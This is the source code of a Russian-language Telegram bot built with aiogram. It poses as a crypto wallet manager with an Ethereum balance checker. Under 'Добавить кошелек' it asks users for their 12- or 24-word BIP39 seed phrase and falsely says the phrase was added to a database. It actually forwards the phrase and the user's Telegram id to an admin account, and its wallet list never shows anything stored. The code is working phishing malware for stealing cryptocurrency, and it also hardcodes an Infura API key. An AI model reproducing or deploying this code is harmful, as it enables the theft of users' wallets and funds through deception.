from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from web3 import Web3, HTTPProvider
import requests

bot = Bot(token="token")
admin_id = 123

storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)


class UserState(StatesGroup):
    user_seed = State()
    user_wallet = State()


web3 = Web3(HTTPProvider('https://mainnet.infura.io/v3/a58ece92356243b48d1447a6bb733eb7'))

main_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
button1_main = types.KeyboardButton(text="Мои кошельки")
button2_main = types.KeyboardButton(text='Добавить кошелек')
button3_main = types.KeyboardButton(text="Удалить кошелек")
button4_main = types.KeyboardButton(text='Проверка баланса эфира по адресу')
main_keyboard.add(button1_main, button2_main, button3_main, button4_main)


database = open("user_ids.txt", "r", encoding="utf-8")
datausers = set()
for line in database:
    datausers.add(line.strip())
database.close()


@dp.message_handler(commands=['start', 'help'])
async def send_welcome(message: types.Message):
    file = open('user_ids.txt', 'r')
    text = file.read()
    inlinekeyboard = types.InlineKeyboardMarkup()
    inlinekeyboard.add(types.InlineKeyboardButton(text="Согласен", callback_data="ok"))
    if not str(message.from_user.id) in text:
        all_id = open("user_ids.txt", "a", encoding="utf-8")
        all_id.write(str(f"{message.from_user.id}\n"))
        datausers.add(message.from_user.id)
        await message.answer('Правила:\n1. one\n2. two\n3. three', reply_markup=inlinekeyboard)
    else:
        await message.answer('Приветствую Вас опять.', reply_markup=main_keyboard)


@dp.callback_query_handler(text="ok")
async def send(call: types.CallbackQuery):
    await call.answer()
    await call.message.answer('Вас привествует бот от @BlazarPython. Используйте меню кнопок', reply_markup=main_keyboard)


@dp.message_handler(content_types=['text'])
async def message(message):
    if message.text == 'Мои кошельки':
        await message.answer('Вы еще не добавили ни одного кошелька')
    elif message.text == 'Удалить кошелек':
        await message.answer('Вы еще не добавили ни одного кошелька')
    elif message.text == 'Добавить кошелек':
        await message.answer('Введите фразу для добавления (формат bip39).')
        await UserState.user_seed.set()
    elif message.text == 'Проверка баланса эфира по адресу':
        await message.answer('Введите кошелёк.')
        await UserState.user_wallet.set()
    else:
        await message.answer('Используйте клавиатуру!!!')


@dp.message_handler(state=UserState.user_seed)
async def wallet(message: types.Message, state: FSMContext):
    idtg = message.from_user.id
    text = message.text
    if int(len(text.split())) == 12 or int(len(text.split())) == 24:
        print(f'{idtg},\n {text}')
        await message.answer('Добавлено в базу.')
        await bot.send_message(admin_id, f'[{idtg}\n{text}]')
        await state.finish()
    else:
        await message.answer('Неверный формат.')


@dp.message_handler(state=UserState.user_wallet)
async def wallet(message: types.Message, state: FSMContext):
    wallet = message.text
    if wallet[:2] == '0x':
        resultat = 'Баланс:'
        count = len(wallet.split('\n'))
        wallet_line = wallet.split('\n')
        print(wallet_line)
        for i in range(count):
            for kowel in wallet_line:
                x = web3.eth.get_balance(f'{kowel}')
                x2 = web3.fromWei(x, 'ether')
                resultat += f'\n{x2}'
        await message.answer(resultat)
        await state.finish()
    else:
        await message.answer('Неверный кошелёк.')

if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)